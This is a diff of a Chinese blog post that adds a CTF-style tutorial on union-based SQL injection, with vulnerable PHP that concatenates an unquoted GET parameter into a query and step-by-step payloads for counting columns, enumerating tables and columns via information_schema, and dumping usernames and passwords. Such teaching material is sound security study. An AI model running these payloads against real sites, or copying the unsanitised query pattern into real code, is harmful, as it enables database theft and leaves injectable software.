@@ -36,7 +36,7 @@
         <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
             <span>📅 发布: 2025-12-11</span>
             <span style="margin: 0 15px;">|</span>
-            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-15</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-21</span>
             
             
              <span style="margin: 0 15px;">|</span>
@@ -50,8 +50,71 @@
 <p>SQL 注入就是指 Web 应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
 <p>这边是一个非常官方性质的解释，按我自己个人的理解，sql注入就是将我们想要执行的操作通过构造sql的形式，绕过web的过滤或者识别，最终完成的句子。</p>
 <p>sql，我个人喜欢的就是分为三种。</p>
-<h2 id="一-回显型的sql注入"><a href="#一-回显型的sql注入" class="headerlink" title="一.回显型的sql注入"></a><strong>一.回显型的sql注入</strong></h2><p>这种注入是看题目存在回显的时候使用，虽然我遇到的大部分题型都是有回显的。</p>
-<h3 id="union-注入-联合注入-："><a href="#union-注入-联合注入-：" class="headerlink" title="union 注入(联合注入)："></a>union 注入(联合注入)：</h3><hr>
+<h2 id="一-回显型的sql注入"><a href="#一-回显型的sql注入" class="headerlink" title="#一.回显型的sql注入"></a><strong>#一.回显型的sql注入</strong></h2><p>这种注入是看题目存在回显的时候使用，虽然我遇到的大部分题型都是有回显的。</p>
+<h3 id="union-注入-联合注入-："><a href="#union-注入-联合注入-：" class="headerlink" title="union 注入(联合注入)："></a>union 注入(联合注入)：</h3><p><code>id=-1 UNION SELECT 1, user(), 3(数字型)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">// 注意：这里的 $id 两边没有单引号</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>拼接后得到 <code>SELECT * FROM news WHERE id = -1 UNION SELECT 1, user(), 3</code></p>
+<p><strong>原理</strong>：利用变量周围不存在单引号的情况，将我们希望执行的命令拼接进入sql语句。在这里就是让数据库去找id&#x3D;-1的内容，但由于id&#x3D;-1没有内容， 返回为null，再通过union，将前半段命令和后半段命令连接起来，使数据库不显示原本news的东西，而是显示1，<code>use()</code>,3。<code>user()</code>是mysql中的一个函数，作用是显示当前数据库的登入用户。</p>
+<p><code>id=-1 UNION SELECT 1, database(), 3(数字型)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">源码:</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">// 注意：无引号保护</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>拼接后得到  <code>SELECT * FROM news WHERE id = -1 UNION SELECT 1, database(), 3</code></p>
+<p><strong>原理：</strong> 利用变量周围不存在单引号的情况，将 SQL 命令拼接进去。这里同样让前半段 <code>id=-1</code> 返回空（null）。然后通过 <code>UNION</code>，在原本显示其他内容的位置显示<code>datebase()</code>函数的值。<code>database()</code>: MySQL 的内置函数，作用是显示当前网站正在使用的数据库名称（比如 <code>ctf_db</code>）。</p>
+<p><code>id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()(数字型)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">// 注意：无引号保护</span><br><span class="line">$sql = &quot;SELECT * FROM news WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>拼接后得到: <code>SELECT * FROM news WHERE id = -1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()</code></p>
+<p><strong>原理</strong>：除了基本的 <code>UNION</code> 拼接外，这里又多了一些内容。</p>
+<ol>
+<li><code>information_schema.tables</code>: 这是 MySQL 自带的一个元数据库表，里面记录了整个数据库服务器里所有表的名单。</li>
+<li><code>WHERE table_schema=database()</code>: 加这个条件是为了过滤，只筛选出当前网站数据库里的表名，防止把其他的都查出来。</li>
+<li><code>group_concat(table_name)</code>: 这一点至关重要。因为网页的回显位通常只有一行，而表名可能有好几个。如果直接查，只能显示第一个。<code>group_concat</code> 的作用是将多行查询结果合并成一个字符串（用逗号分隔），全部打包显示出来。</li>
+</ol>
+<h3 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a>小总结：</h3><h3 id="第一阶段：侦察-Reconnaissance"><a href="#第一阶段：侦察-Reconnaissance" class="headerlink" title="第一阶段：侦察 (Reconnaissance)\"></a>第一阶段：侦察 (Reconnaissance)\</h3><h4 id="Step-1-确认注入点"><a href="#Step-1-确认注入点" class="headerlink" title="Step 1: 确认注入点"></a>Step 1: 确认注入点</h4><p><strong>目标：</strong> 确定 <code>SELECT *</code> 到底代表几列，为后面的 <code>UNION</code> 做准备。 <strong>核心命令：</strong> <code>ORDER BY</code></p>
+<ol>
+<li><p><strong>验证数字型：</strong></p>
+<ul>
+<li>输入 <code>id=2-1</code>。如果页面显示的内容和 <code>id=1</code> 一样，说明数据库执行了减法运算，确认为数字型注入。</li>
+</ul>
+</li>
+<li><p><strong>二分法&#x2F;递增法测试：</strong></p>
+<ul>
+<li><p><code>id=1 ORDER BY 10</code> (报错&#x2F;空) -&gt; 太多了。</p>
+</li>
+<li><p><code>id=1 ORDER BY 5</code> (报错&#x2F;空) -&gt; 还是多。</p>
+</li>
+<li><p><code>id=1 ORDER BY N</code> (正常显示) -&gt; 这里的 <strong>N</strong> 就是我们要找的关键数字 。</p>
+</li>
+</ul>
+</li>
+</ol>
+<h4 id="Step-2-寻找回显位"><a href="#Step-2-寻找回显位" class="headerlink" title="Step 2: 寻找回显位"></a>Step 2: 寻找回显位</h4><p><strong>目标：</strong> 看看这 N 列中，哪几列的数据会被打印在网页上。 <strong>核心命令：</strong> <code>-1 UNION SELECT</code> +</p>
+<p><strong>操作：</strong> 让前半部分 ID 失效，强制显示后半部分。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, 2, 3</span><br></pre></td></tr></table></figure>
+
+<p><strong>观察：</strong> 看看网页上原本显示标题的地方变成了 <code>2</code>，还是 <code>3</code>？</p>
+<p><strong>结果</strong>：得到输出点</p>
+<h3 id="第二阶段：取证"><a href="#第二阶段：取证" class="headerlink" title="第二阶段：取证"></a>第二阶段：取证</h3><h4 id="Step-3-爆数"><a href="#Step-3-爆数" class="headerlink" title="Step 3: 爆数"></a>Step 3: 爆数</h4><p><strong>目标：</strong> 知道我们在哪个库里，版本是多少（版本决定了能不能用 <code>information_schema</code>）。 <strong>核心命令：</strong> <code>database()</code>, <code>version()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, database(), 3</span><br></pre></td></tr></table></figure>
+
+<p><strong>结论</strong>：得到数据库的名字。</p>
+<h3 id="第三阶段：拖库"><a href="#第三阶段：拖库" class="headerlink" title="第三阶段：拖库"></a>第三阶段：拖库</h3><h3 id="Step-4-爆表名"><a href="#Step-4-爆表名" class="headerlink" title="Step 4: 爆表名"></a>Step 4: 爆表名</h3><p><strong>目标：</strong> 拿到当前数据库下所有的表名。 <strong>核心库：</strong> <code>information_schema.tables</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, group_concat(table_name), 3</span><br><span class="line">FROM information_schema.tables</span><br><span class="line">WHERE table_schema = &#x27;数据库&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong>记下来：</strong> 假设结果是 <code>news, users, logs</code>。目标显然是 <strong><code>users</code></strong>。</p>
+<h4 id="Step-5-爆列名"><a href="#Step-5-爆列名" class="headerlink" title="Step 5: 爆列名"></a>Step 5: 爆列名</h4><p><strong>目标：</strong> 拿到 <code>users</code> 表里都有哪些字段（比如账号、密码叫什么）。 <strong>核心库：</strong> <code>information_schema.columns</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, group_concat(column_name), 3</span><br><span class="line">FROM information_schema.columns</span><br><span class="line">WHERE table_name = &#x27;users&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><em>(注意：如果不同库有同名表，最好加上 <code>AND table_schema=&#39;ctf_db&#39;</code>)</em></p>
+<ul>
+<li><strong>记下来：</strong> 假设结果是 <code>id, username, password, flag</code>。目标显然是 <strong><code>flag</code></strong> 或者 <code>password</code>。</li>
+</ul>
+<h4 id="Step-6-爆数据"><a href="#Step-6-爆数据" class="headerlink" title="Step 6: 爆数据"></a>Step 6: 爆数据</h4><p><strong>目标：</strong> 取出最终的秘密。 <strong>核心表：</strong> 直接查 Step 4 拿到的表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 UNION SELECT 1, group_concat(username, &#x27;~&#x27;, password), 3</span><br><span class="line">FROM users</span><br></pre></td></tr></table></figure>
+
+<p><strong>结果：</strong> <code>admin~123456, root~flag{congratulations}</code></p>
+<hr>
 <p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
         </div>
